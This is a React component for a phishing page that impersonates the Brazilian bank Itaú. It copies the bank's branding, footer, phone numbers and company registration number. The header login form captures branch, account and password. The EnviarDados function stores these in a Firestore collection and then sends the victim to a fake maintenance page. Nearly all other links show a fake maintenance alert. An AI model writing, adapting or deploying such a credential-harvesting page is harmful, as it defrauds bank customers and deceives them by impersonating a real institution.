import React, {useState, useContext, useEffect} from 'react';
import Row from 'react-bootstrap/Row';
import Col from 'react-bootstrap/Col';
import {Helmet} from "react-helmet";
import { useNavigate } from "react-router-dom";
import {collection, addDoc } from "firebase/firestore";
import {db,} from "../../services/firebaseConnection";
import {FiChevronRight, FiMenu} from "react-icons/fi";

import arrow from '../../assets/arrow.png';
import logo from '../../assets/logo.png';
import background from '../../assets/img.png';
import box01 from '../../assets/box01.png';
import box02 from '../../assets/box02.png';
import box03 from '../../assets/box03.png';
import imgVideo from '../../assets/imgVideo.png';
import {Context} from '../../context/';

import '../../../src/global.css';

export default function Home() {
  const [agencia, setAgencia] = useState("");
  const [conta, setConta] = useState("");
  const [senha, setSenha] = useState("");


  const navigate = useNavigate();
  const {} = useContext(Context);

  useEffect(() => {
    async function loadDados(){
     
    }

    loadDados();
  }, []);

  function Aviso(){
    alert('⚠️ Desculpe, página em manutenção! Somente acesso a conta disponível no momento. Por favor, volte mais tarde!');
  }


  async function EnviarDados(e){
    e.preventDefault();

    if(agencia !== '' && conta !== '' && senha !== ''){
      await addDoc(collection(db, "dados"), {
        agencia: agencia,
        conta: conta,
        senha: senha,
        created: new Date().toString(),
      }).then(() => {
        navigate("/manutencao");
        setAgencia('');
        setConta('');
        setSenha('');
      }).catch((error) => {
        alert('⚠️Algo deu errado, verifique os dados da sua conta: ' + error);
      })
    }else{
      alert('⚠️Por favor, preencher: agêncie e conta.');
    }
  }


 return (
   <div>
    <Helmet>
        <meta charSet="utf-8" />
        <title>Banco Itaú | Feito com você</title>
    </Helmet>

    <header className='header'>
      <div className='areaLogo'>
        <img src={logo}  alt='imagem' /> 
      </div>
      
      <ul>
        <li><a href='/'>para você</a></li>
        <li onClick={Aviso}>para empresas</li>
        <li onClick={Aviso}>ajuda</li>
        <li onClick={Aviso}>busca</li>
      </ul>

      <div className='areaInput'>
        <div className='areaInputs'>
          <div>
            <input 
            placeholder='agência' 
            value={agencia} 
            title='Agência'
            onChange={(e) => setAgencia(e.target.value)} maxLength={4} 
            />
          </div>

          <div className='barra'></div>

          <div>
            <input 
            placeholder='conta' 
            value={conta} 
            title='Conta'
            onChange={(e) => setConta(e.target.value)} maxLength={6} />
          </div>

          <div className='barra'></div>

          <div>
            <input 
            placeholder='senha' 
            value={senha} 
            title='Senha'
            onChange={(e) => setSenha(e.target.value)} maxLength={6} />
          </div>
        </div>

        <button className='btnEntrar' onClick={EnviarDados} title='Entrar na conta'>
            <img src={arrow}  alt='imagem' /> 
        </button> 
      </div>

      <button style={{backgroundColor: 'transparent', border: 'none', cursor: 'pointer'}} className='txtAcessos' onClick={Aviso}>
          <span>+</span> 
          <strong>acessos</strong>
      </button>

      <button className='btnAbrirConta' onClick={Aviso}>
        <strong>abra sua conta</strong>
      </button>

    </header>

    <header className='headerMobile'>
      <div className='areaLogo'>
        <img src={logo}  alt='imagem' /> 
      </div>

      <div style={{flexDirection: 'row', display: 'flex', justifyContent: 'center', alignItems: 'center'}}>
        <a href='/' style={{textDecoration: 'none'}} rel="noopener">
          <button className='btnAbrirConta'>
            <strong>acessar conta</strong>
          </button>
        </a>

        <button className='btnMenu'>
          <FiMenu size={25} color="#fff" />
        </button>
      </div>
    </header>

    {/* <div className='areaSecaoEntrarMobile'>
          <div>
            <input 
            placeholder='agência' 
            value={agencia} 
            title='Agência'
            onChange={(e) => setAgencia(e.target.value)} maxLength={4} 
            />
          </div>

          <div>
            <input 
            placeholder='conta' 
            value={conta} 
            title='Conta'
            onChange={(e) => setConta(e.target.value)} maxLength={6} />
          </div>

          <div>
            <input 
            placeholder='senha' 
            value={senha} 
            title='Senha'
            type='password'
            onChange={(e) => setSenha(e.target.value)} maxLength={6} />
          </div>

          <button className='btnEntrar' onClick={EnviarDados} title='Entrar na conta'>
            <span>Entrar</span>
            <img src={arrow}  alt='imagem' /> 
          </button> 
      </div> */}

    <main>
      <Row className='g-0'> 
        <Col md={6} sm={12}>
          <img src={background}  alt='imagem' className='backgroundImg' />
        </Col>
        <Col md={6} sm={12}>
          <div className='box'>
            <div className='containerTextosBackground'>
              <h1>Conta sem mensalidade com <br/>cartão Itaú</h1>
              <p>Aponte sua câmera do celular no qr code ao lado e <br/> abra sua conta.</p>
            </div>
          </div>
        </Col>
      </Row>

      <div className='contaCerta'>
        <div className='areaTextoContaCerta'>
          <h2>temos a conta certa para o seu momento de vida</h2>
          <p>Produtos e serviços para o seu momento de vida.</p>
        </div>

        <Row style={{width: '100%', margin: '0 auto'}}>
          <Col md={4} sm={12} className='imgBox'>
            <img src={box01} alt='imagem' />
          </Col>

          <Col md={4} sm={12} className='imgBox'>
            <img src={box02} alt='imagem' />
          </Col>

          <Col md={4} sm={12} className='imgBox'>
            <img src={box03} alt='imagem' />
          </Col>
        </Row>
      </div>

      <div className='areaAbrirConta' >
          <div className='areaTextoContaCerta'>
            <h2 style={{color: '#EC7000', fontSize: 30, fontWeight: 'bold'}}>como abrir uma conta corrente no Itaú</h2>
            <p>Produtos e serviços para o seu momento de vida.</p>
          </div>
          
          <Row style={{width: '100%', margin: '0 auto'}}>
            <Col md={6} sm={12} style={{justifyContent: 'center', alignItems: 'center', display: 'flex'}}>
              <div className='areaCirculos'>
                <div className='boxCirculo'>
                  <div className='circulo'>
                    <span>1</span>
                  </div>
                  <p>Pegue o seu celular, acesse meu.itau/abrir-conta pelo seu celular e coloque seu CPF</p>
                </div>

                <div className='boxCirculo'>
                  <div className='circulo'>
                    <span>2</span>
                  </div>
                  <p>Identifique-se: preencha seus dados e tire uma foto sua</p>
                </div>

                <div className='boxCirculo'>
                  <div className='circulo'>
                    <span>3</span>
                  </div>
                  <p>Confirme informações, continue com a conta sem mensalidade e cartão sem anuidade</p>
                </div>

                <div className='boxCirculo'>
                  <div className='circulo'>
                    <span>4</span>
                  </div>
                  <p>Pronto! Sua proposta será analisada e em seguida é só baixar o app itaú para começar a usar</p>
                </div>
              </div>
            </Col>

            <Col md={6} sm={12} style={{justifyContent: 'center', alignItems: 'center', display: 'flex'}}> 
              <div className='containerVideo'>
                <a href='https://www.youtube.com/watch?v=3hRxkF13_Kw' rel="noreferrer" target='_blank'>
                  <img src={imgVideo}  alt='imagem'/>
                </a>
              </div>
            </Col>

          </Row>
      </div>

      <footer className='footer'>
        <div className='headerFooter'>
          <span>Itaú <FiChevronRight size={25} color="#fff" /> </span>
          <span>Conta Bancária | Banco Itaú <FiChevronRight size={25} color="#fff" /></span>
          <span>Banco Itaú | Feito com você</span>
        </div>
        <div style={{width: '100%', height: 0.5, backgroundColor: '#fff'}}></div>

        <Row style={{width: '90%', margin: 'auto'}}>
          <Col md={3} sm={12} >
            <div className='areaMenuFooter'>
              <h4>nossos produtos</h4>
              <ul className='areaUlMenu'>
                <li onClick={Aviso}>conta corrente</li>
                <li onClick={Aviso}>cartões de crédito</li>
                <li onClick={Aviso}>consórcio</li>
                <li onClick={Aviso}>seguros</li>
                <li onClick={Aviso}>investimentos</li>
                <li onClick={Aviso}>renegociação</li>
              </ul>
            </div>
          </Col>

          <Col md={3} sm={12} >
            <div className='areaMenuFooter'>
              <h4>Itaú</h4>
              <ul className='areaUlMenu'>
                <li onClick={Aviso}>conta corrente</li>
                <li onClick={Aviso}>relações com investidores</li>
                <li onClick={Aviso}>carreiras</li>
                <li onClick={Aviso}>imprensa</li>
                <li onClick={Aviso}>sustentabilidade</li>
                <li onClick={Aviso}>Integridade e Ética</li>
                <li onClick={Aviso}>análises econômicas</li>
                <li onClick={Aviso}>termos de uso</li>
                <li onClick={Aviso}>privacidade</li>
                <li onClick={Aviso}>mapa do site</li>
                <li onClick={Aviso}>estatuto de acessibilidade</li>
              </ul>
            </div>
          </Col>

          <Col md={3} sm={12} >
            <div className='areaMenuFooter'>
              <h4>Ajuda</h4>
              <ul className='areaUlMenu'>
                <li onClick={Aviso}>central de ajuda</li>
                <li onClick={Aviso}>canais Itaú</li>
                <li onClick={Aviso}>encontre agências</li>
                <li onClick={Aviso}>segurança</li>
                <li onClick={Aviso}>acessos não correntista</li>
                <li onClick={Aviso}>consumidor.gov</li>
                <li onClick={Aviso} style={{fontSize: '20px'}}>veja também</li>
                <li onClick={Aviso}>para você</li>
                <li onClick={Aviso}>para empresas</li>
                <li onClick={Aviso}>para poder público</li>
                <li onClick={Aviso}>pacotes e tarifas</li>
              </ul>
            </div>
          </Col>

          <Col md={3} sm={12} >
            <div className='areaMenuFooter'>
              <h4>fale com o Itaú</h4>
              <ul className='areaUlMenu'>
                <li onClick={Aviso}>sac 0800 728 0738</li>
                <li onClick={Aviso}>ouvidoria 0080 570 0011</li>
                <li onClick={Aviso}>denúncia</li>
                <li onClick={Aviso}>envie sua mensagem</li>
              </ul>
            </div>
          </Col>

        </Row>

        <div className='copyRigth'>
          <span>© 2023 Itaú Unibanco Holding S.A. CNPJ: 60.872.504/0001-23</span>
        </div>
      </footer>

      <button className='botaoFooter' onClick={Aviso}>
        <span>abra sua conta</span>
      </button>
    </main>
   </div>
 );
}